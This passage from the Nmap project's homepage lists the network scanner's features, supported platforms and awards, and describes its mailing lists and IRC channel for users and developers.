  UDP), [OS
  detection](/book/osdetect.html), [version detection](/book/vscan.html), ping sweeps, and more. See the [documentation page](/docs.html).* **Powerful**: Nmap has been used to scan huge networks of
    literally hundreds of thousands of machines.* **Portable**: Most operating systems are supported, including
      Linux,
      Microsoft Windows,
      FreeBSD,
      OpenBSD,
      Solaris,
      IRIX,
      Mac OS X,
      HP-UX,
      NetBSD,
      Sun OS,
      Amiga,
      and more.* **Easy**: While Nmap offers a rich set of advanced features for
        power users, you can start out as simply as "nmap -v -A *targethost*". Both traditional command line and graphical (GUI)
        versions are available to suit your preference. Binaries are
        available for those who do not wish to compile Nmap from source.* **Free**: The primary goals of the Nmap Project is to help make
          the Internet a little more secure and to provide
          administrators/auditors/hackers with an advanced tool for exploring
          their networks. Nmap is available for [free download](https://nmap.org/download.html), and also comes with full
          source code that you may modify and redistribute under the terms of
          the [license](data/COPYING).* **Well Documented**: Significant effort has been put into
            comprehensive and up-to-date man pages, whitepapers, tutorials, and
            even a whole book! Find them in multiple
            languages [here](/docs.html).* **Supported**: While Nmap comes with no warranty, it is well supported by a vibrant community of developers and users. Most of this interaction occurs on the [Nmap mailing lists](#lists). Most bug reports and questions should be sent to the [nmap-dev list](https://seclists.org/nmap-dev), but only after you read the [guidelines](/book/man-bugs.html). We recommend that all users subscribe to the low-traffic [nmap-hackers](https://seclists.org/nmap-hackers) announcement list. You can also find Nmap on [Facebook](http://facebook.com/nmap) and [Twitter](http://twitter.com/nmap). For real-time chat, join the #nmap channel on [Freenode](http://freenode.net/) or [EFNet](http://www.efnet.org/).* **Acclaimed**: Nmap has won numerous awards, including
                "Information Security Product of the Year" by Linux Journal, Info
                World and Codetalker Digest. It has been featured in hundreds of
                magazine articles, several movies, dozens of books, and one comic book
                series. Visit the [press page](nmap_inthenews.html)
                for further details.* **Popular**: Thousands of people download Nmap every day, and
                  it is included with many operating systems (Redhat Linux, Debian
                  Linux, Gentoo, FreeBSD, OpenBSD, etc). It is among the top ten (out of
                  30,000) programs at the Freshmeat.Net repository. This is important
                  because it lends Nmap its vibrant development and user support
                  communities.

## Communication

Nmap users are encouraged to subscribe to the *Nmap-hackers*
mailing list. It is a low volume (6 posts in 2017), moderated list
for the most important announcements about Nmap, Insecure.org, and
related projects. You can join more than 128,000 current subscribers
by submitting your email address here:

(or subscribe with custom options from the [Nmap-hackers list info page](https://nmap.org/mailman/listinfo/announce))

We also have a development list for more hardcore members
(especially programmers) who are interested in helping the project by
helping with coding, testing, feature ideas, etc. New (test/beta)
versions of Nmap are sometimes released here prior to general
availability for QA purposes. You can subscribe at the [Nmap-dev list
info page](https://nmap.org/mailman/listinfo/dev).

Both lists are archived (along with many other security lists) at [Seclists.org](https://seclists.org).

Though it isn't nearly as active as the mailing lists, the official IRC channel is #nmap on [Freenode](http://freenode.net/) (irc.freenode.net).
